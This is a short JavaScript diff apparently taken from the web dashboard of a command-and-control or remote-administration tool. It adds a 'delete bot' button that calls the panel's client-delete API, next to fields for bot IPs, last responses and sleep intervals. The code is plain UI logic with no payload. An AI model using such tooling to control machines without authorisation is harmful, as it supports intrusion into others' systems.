@@ -37,6 +37,7 @@ function clients_list(){
                             symbol = "fa-apple";
                         }
                     }
+                    $("#delBot").data("botid", i);
                     $('#cmdip').val(bot.IP);
                     $('#intip').val(bot.IP);
                     $('#lastResponse').html(bot.last_response);
@@ -89,6 +90,16 @@ function submit_to_api(e){
             if (target == "sleep-interval"){
                 $("td.intervaltd").val($('#interval').val());
             }
+        }
+    });
+}
+
+function delete_bot(e){
+    $.ajax({
+        url: '/api/clients/delete/' + $('#delBot').data("botid"),
+        type: 'GET',
+        success: function (data, textStatus, xhr) {
+            $('#modal-pop').modal('toggle');
         }
     });
 }
